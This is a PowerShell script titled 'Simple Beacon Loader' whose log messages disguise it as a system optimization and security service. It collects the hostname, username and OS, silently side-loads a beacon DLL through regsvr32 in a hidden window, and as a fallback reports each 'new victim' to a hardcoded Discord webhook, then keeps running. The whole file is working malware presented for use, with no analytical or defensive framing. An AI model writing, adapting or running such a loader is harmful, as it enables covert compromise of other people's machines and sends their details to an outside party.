# Simple Beacon Loader
param([switch]$Silent = $false)

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Message" -ForegroundColor Green
    }
}

# Load and execute beacon DLL
try {
    Write-Log "Starting system optimization service..."
    
    # Get system info
    $hostname = $env:COMPUTERNAME
    $user = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    
    Write-Log "Host: $hostname\$user"
    Write-Log "OS: $os"
    
    # Load beacon DLL via reflection
    $beaconPath = ".\beacon_enhanced.dll"
    if (Test-Path $beaconPath) {
        Write-Log "Loading enhanced security module..."
        
        # Load beacon DLL via regsvr32 (stealth sideloading)
        $regArgs = "/s `"$beaconPath`""
        Start-Process -FilePath "regsvr32.exe" -ArgumentList $regArgs -WindowStyle Hidden -Wait
        
        Write-Log "Security module loaded successfully"
        
        # Keep process alive
        Write-Log "Service running in background..."
        while ($true) {
            Start-Sleep -Seconds 60
        }
    }
    else {
        Write-Log "Enhanced module not found, using basic monitoring..."
        
        # Fallback - just keep alive and phone home via Discord
        $webhook = "https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM"
        
        $payload = @{
            content = "[FIRE] New victim: $hostname\$user - $os"
        } | ConvertTo-Json
        
        try {
            Invoke-RestMethod -Uri $webhook -Method POST -Body $payload -ContentType "application/json"
            Write-Log "Initial contact established"
        }
        catch {
            Write-Log "Contact failed, retrying later..."
        }
        
        # Keep alive
        while ($true) {
            Start-Sleep -Seconds 300
        }
    }
}
catch {
    Write-Log "Service error: $($_.Exception.Message)"
    exit 1
}